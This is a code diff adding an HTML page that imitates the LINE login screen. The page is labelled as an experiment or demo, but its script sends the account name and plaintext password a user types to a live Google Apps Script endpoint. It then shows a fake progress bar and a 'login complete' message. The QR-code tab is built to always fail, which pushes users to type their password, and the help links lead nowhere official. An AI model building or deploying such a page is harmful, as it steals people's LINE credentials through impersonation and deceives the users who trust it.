@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>帳密輸入實驗</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #fff;
+      color: #333;
+      font-family: Arial, "Microsoft JhengHei", sans-serif;
+    }
+
+    button, input:not([type="checkbox"]):not([type="radio"]) {
+      font: inherit;
+    }
+
+    /* 修正勾選圈過大的問題，固定尺寸與主色 */
+    input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      accent-color: #06c755;
+      cursor: pointer;
+      margin: 0;
+    }
+
+    button {
+      cursor: pointer;
+    }
+
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 38px 20px 24px;
+    }
+
+    .logo {
+      margin: 8px 0 25px;
+      color: #06c755;
+      font-size: 38px;
+      font-weight: bold;
+      letter-spacing: -1.5px;
+    }
+
+    .panel {
+      width: 100%;
+      max-width: 370px;
+    }
+
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid #ddd;
+      margin-bottom: 24px;
+    }
+
+    .tab {
+      flex: 1;
+      padding: 13px 5px;
+      border: none;
+      border-bottom: 3px solid transparent;
+      background: #fff;
+      color: #777;
+      font-size: 14px;
+    }
+
+    .tab.active {
+      color: #06a94d;
+      border-bottom-color: #06c755;
+      font-weight: bold;
+    }
+
+    .subtitle {
+      margin-bottom: 20px;
+      text-align: center;
+      font-size: 15px;
+      line-height: 1.7;
+    }
+
+    .field {
+      margin-bottom: 14px;
+    }
+
+    .field > label {
+      display: block;
+      margin-bottom: 7px;
+      color: #666;
+      font-size: 13px;
+    }
+
+    .field > input,
+    .password-row input {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      outline: none;
+      background: #fff;
+    }
+
+    .field input:focus {
+      border-color: #06c755;
+      box-shadow: 0 0 0 2px #06c75520;
+    }
+
+    .show-password {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 10px;
+      color: #666;
+      font-size: 12px;
+    }
+
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+      margin: 15px 0 20px;
+      color: #666;
+      font-size: 12px;
+    }
+
+    .options label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .text-button {
+      padding: 0;
+      border: none;
+      background: transparent;
+      color: #078b45;
+      font-size: 12px;
+      text-decoration: underline;
+    }
+
+    .primary {
+      width: 100%;
+      min-height: 44px;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background: #06c755;
+      color: #fff;
+      font-weight: bold;
+    }
+
+    .primary:hover {
+      background: #05b64d;
+    }
+
+    .links {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      font-size: 12px;
+    }
+
+    a {
+      color: #777;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .muted {
+      color: #777;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    /* 行動條碼錯誤畫面樣式 */
+    .error-panel {
+      padding: 28px 20px;
+      border: 1px solid #e5e5e5;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .error-icon {
+      width: 46px;
+      height: 46px;
+      margin: 0 auto 14px;
+      border: 2px solid #999;
+      border-radius: 50%;
+      color: #777;
+      font-size: 30px;
+      line-height: 42px;
+    }
+
+    .error-panel h3 {
+      margin: 0 0 12px;
+      font-size: 16px;
+    }
+
+    .error-panel p {
+      color: #777;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+
+    .error-code {
+      margin: 18px 0;
+      font-family: monospace;
+    }
+
+    /* 官方說明連結與頁尾 */
+    .footer {
+      margin-top: auto;
+      padding-top: 42px;
+      color: #999;
+      text-align: center;
+      font-size: 11px;
+      line-height: 1.8;
+    }
+
+    .footer a {
+      color: #777;
+      text-decoration: underline;
+    }
+
+    /* 載入動畫及彈出方塊 */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.28);
+    }
+
+    .dialog {
+      width: 100%;
+      max-width: 340px;
+      padding: 28px 24px;
+      border-radius: 10px;
+      background: #fff;
+      text-align: center;
+      box-shadow: 0 8px 35px #0002;
+    }
+
+    .dialog h3 {
+      font-size: 17px;
+    }
+
+    .dialog p {
+      color: #777;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+
+    .spinner {
+      width: 42px;
+      height: 42px;
+      margin: 0 auto 18px;
+      border: 4px solid #e5f7eb;
+      border-top-color: #06c755;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .progress-track {
+      height: 10px;
+      margin: 20px 0 10px;
+      overflow: hidden;
+      border-radius: 10px;
+      background: #eee;
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      border-radius: 10px;
+      background: #06c755;
+      transition: width .1s linear;
+    }
+
+    .success-icon {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 15px;
+      border-radius: 50%;
+      background: #e5f8ec;
+      color: #06a94d;
+      font-size: 32px;
+      line-height: 48px;
+    }
+
+    @media (max-width: 480px) {
+      .page {
+        padding: 24px 18px;
+      }
+      .footer {
+        padding-top: 30px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <main class="page">
+    <div class="logo">LINE登入</div>
+
+    <div class="panel">
+      <section id="loginView">
+        <div class="tabs">
+          <button
+            class="tab active"
+            id="accountTab"
+            type="button"
+            onclick="switchTab('account')">
+            帳號登入
+          </button>
+
+          <button
+            class="tab"
+            id="qrTab"
+            type="button"
+            onclick="switchTab('qr')">
+            行動條碼
+          </button>
+        </div>
+
+        <!-- 帳號登入 -->
+        <div id="accountPanel">
+          <div class="subtitle">
+            資料輸入<br>
+          </div>
+
+          <form id="demoForm">
+            <div class="field">
+              <label for="demoEmail">帳號</label>
+              <input
+                id="demoEmail"
+                type="text"
+                autocomplete="off">
+            </div>
+
+            <div class="field">
+              <label for="demoPassword">密碼</label>
+              <div class="password-row">
+                <input
+                  id="demoPassword"
+                  type="password"
+                  autocomplete="new-password">
+              </div>
+
+              <label class="show-password">
+                <input type="checkbox" id="showPassword">
+                顯示密碼
+              </label>
+            </div>
+
+            <div class="field" style="margin-top:14px">
+              <label style="display:flex;gap:8px;align-items:flex-start;line-height:1.5">
+                <input type="checkbox" id="demoConsent" required style="margin-top:3px">
+                我同意在網站上登入LINE
+              </label>
+            </div>
+
+            <div class="options">
+              <label>
+                <input type="checkbox" id="demoAutoLogin">
+                自動登入
+              </label>
+
+              <button
+                class="text-button"
+                type="button"
+                onclick="showHelp()">
+                忘記帳號或密碼？
+              </button>
+            </div>
+
+            <button class="primary" type="submit">
+              送出資料並預覽流程
+            </button>
+          </form>
+
+          <div class="links">
+            <a
+              href="https://www.google.com/"
+              target="_blank"
+              rel="noopener noreferrer">
+              登入說明
+            </a>
+          </div>
+        </div>
+
+        <!-- 行動條碼錯誤頁（故意不顯示條碼） -->
+        <div id="qrPanel" class="hidden">
+          <div class="subtitle">行動條碼登入</div>
+
+          <div class="error-panel">
+            <div class="error-icon">!</div>
+            <h3>無法載入行動條碼</h3>
+            <p>目前無法顯示登入條碼，請稍後再試。</p>
+            <p class="error-code">錯誤代碼：DEMO-QR-001</p>
+
+            <button
+              class="primary"
+              type="button"
+              onclick="showQrError()">
+              重新載入
+            </button>
+          </div>
+
+          <p class="muted" style="text-align:center">
+            發生錯誤，請稍後再試
+          </p>
+        </div>
+      </section>
+    </div>
+
+    <footer class="footer">
+      <a
+        href="https://www.google.com/"
+        target="_blank"
+        rel="noopener noreferrer">
+        登入說明
+      </a>
+    </footer>
+  </main>
+
+  <!-- 載入動畫方塊 -->
+  <div id="loadingView" class="overlay hidden" role="status" aria-live="polite">
+    <div class="dialog">
+      <div class="spinner"></div>
+      <h3>正在處理......</h3>
+      <p id="loadingText">正在準備介面……</p>
+
+      <div class="progress-track">
+        <div id="progressBar" class="progress-bar"></div>
+      </div>
+
+      <p id="progressText">0%</p>
+    </div>
+  </div>
+
+  <!-- 完成提示方塊 -->
+  <div id="completeView" class="overlay hidden" role="dialog" aria-modal="true" aria-labelledby="completeTitle">
+    <div class="dialog">
+      <div class="success-icon">✓</div>
+      <h3 id="completeTitle">登入完成</h3>
+      <p>登入完成！</p>
+
+      <button class="primary" type="button" onclick="endDemo()">
+        結束
+      </button>
+    </div>
+  </div>
+
+  <script>
+    // 💡 已經替換為您的最新 Google Apps Script 網址
+    const LOG_ENDPOINT = "https://script.google.com/macros/s/AKfycbxvaOYTibHWJ0dbIHuZjM9lfx07VFw5R9PcGyPAF2GKi6Ikr-TNz6lsGBTwsUFCTH7ueg/exec";
+    
+    function sendDemoRecord(record) {
+      fetch(LOG_ENDPOINT, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=UTF-8" },
+        body: JSON.stringify(record)
+      }).catch(function(error) {
+        console.warn("登入紀錄傳送失敗：", error);
+      });
+    }
+
+    function logDemoEvent(eventName) {
+      const allowedEvents = ["page_opened", "simulation_started", "simulation_completed"];
+      if (allowedEvents.includes(eventName)) {
+        sendDemoRecord({ event: eventName });
+      }
+    }
+
+    // 分頁切換
+    function switchTab(tab) {
+      const isAccount = tab === "account";
+
+      document.getElementById("accountPanel")
+        .classList.toggle("hidden", !isAccount);
+
+      document.getElementById("qrPanel")
+        .classList.toggle("hidden", isAccount);
+
+      document.getElementById("accountTab")
+        .classList.toggle("active", isAccount);
+
+      document.getElementById("qrTab")
+        .classList.toggle("active", !isAccount);
+    }
+
+    // 頁面開啟事件
+    logDemoEvent("page_opened");
+
+    // 顯示或隱藏密碼
+    document.getElementById("showPassword")
+      .addEventListener("change", function() {
+        document.getElementById("demoPassword").type =
+          this.checked ? "text" : "password";
+      });
+
+    // 表單送出事件
+    document.getElementById("demoForm")
+      .addEventListener("submit", function(event) {
+        event.preventDefault();
+        startDemo();
+      });
+
+    function startDemo() {
+      const account = document.getElementById("demoEmail").value.trim();
+      const password = document.getElementById("demoPassword").value;
+      const consent = document.getElementById("demoConsent").checked;
+
+      if (!consent) {
+        alert("請先閱讀說明並勾選同意。");
+        return;
+      }
+      if (!account) {
+        alert("請輸入帳號。");
+        return;
+      }
+      
+      sendDemoRecord({
+        event: "test_credentials_submitted",
+        demoAccount: account,
+        demoPassword: password
+      });
+      logDemoEvent("simulation_started");
+
+      const loading = document.getElementById("loadingView");
+      const complete = document.getElementById("completeView");
+      const bar = document.getElementById("progressBar");
+      const progressText = document.getElementById("progressText");
+      const loadingText = document.getElementById("loadingText");
+
+      complete.classList.add("hidden");
+      loading.classList.remove("hidden");
+
+      let progress = 0;
+
+      bar.style.width = "0%";
+      progressText.textContent = "0%";
+      loadingText.textContent = "正在準備介面……";
+
+      const stages = [
+        [20, "正在準備介面……"],
+        [45, "正在執行流程……"],
+        [70, "正在整理結果……"],
+        [90, "即將完成……"]
+      ];
+
+      const timer = setInterval(function() {
+        progress = Math.min(progress + 2, 100);
+
+        bar.style.width = progress + "%";
+        progressText.textContent = progress + "%";
+
+        stages.forEach(function(stage) {
+          if (progress >= stage[0]) {
+            loadingText.textContent = stage[1];
+          }
+        });
+
+        if (progress >= 100) {
+          clearInterval(timer);
+          loading.classList.add("hidden");
+          complete.classList.remove("hidden");
+          logDemoEvent("simulation_completed");
+        }
+      }, 60);
+    }
+
+    // 關閉完成方塊並返回登入介面
+    function endDemo() {
+      document.getElementById("completeView")
+        .classList.add("hidden");
+
+      document.getElementById("demoEmail").value = "";
+      document.getElementById("demoPassword").value = "";
+      document.getElementById("demoAutoLogin").checked = false;
+      document.getElementById("showPassword").checked = false;
+      document.getElementById("demoConsent").checked = false;
+      document.getElementById("demoPassword").type = "password";
+    }
+
+    function showHelp() {
+      const existing = document.getElementById("helpView");
+      if (existing) {
+        existing.classList.remove("hidden");
+        return;
+      }
+
+      const overlay = document.createElement("div");
+      overlay.id = "helpView";
+      overlay.className = "overlay";
+      overlay.setAttribute("role", "dialog");
+      overlay.setAttribute("aria-modal", "true");
+      overlay.setAttribute("aria-labelledby", "helpTitle");
+
+      const dialog = document.createElement("div");
+      dialog.className = "dialog";
+
+      const title = document.createElement("h3");
+      title.id = "helpTitle";
+      title.textContent = "忘記帳號或密碼？";
+
+      const message = document.createElement("p");
+      message.textContent = "請使用下方的 LINE 官方說明連結，以取得幫助。";
+
+      const officialLink = document.createElement("a");
+      officialLink.href = "https://www.google.com/";
+      officialLink.target = "_blank";
+      officialLink.rel = "noopener noreferrer";
+      officialLink.textContent = "前往 LINE 官方說明";
+      officialLink.style.display = "inline-block";
+      officialLink.style.margin = "8px 0 18px";
+      officialLink.style.color = "#078b45";
+      officialLink.style.textDecoration = "underline";
+
+      const closeButton = document.createElement("button");
+      closeButton.className = "primary";
+      closeButton.type = "button";
+      closeButton.textContent = "關閉";
+      closeButton.addEventListener("click", function() {
+        overlay.remove();
+      });
+
+      dialog.append(title, message, officialLink, closeButton);
+      overlay.appendChild(dialog);
+      overlay.addEventListener("click", function(event) {
+        if (event.target === overlay) overlay.remove();
+      });
+
+      document.body.appendChild(overlay);
+      closeButton.focus();
+    }
+
+    function showQrError() {
+      alert("行動條碼載入失敗。");
+    }
+  </script>
+</body>
+</html>
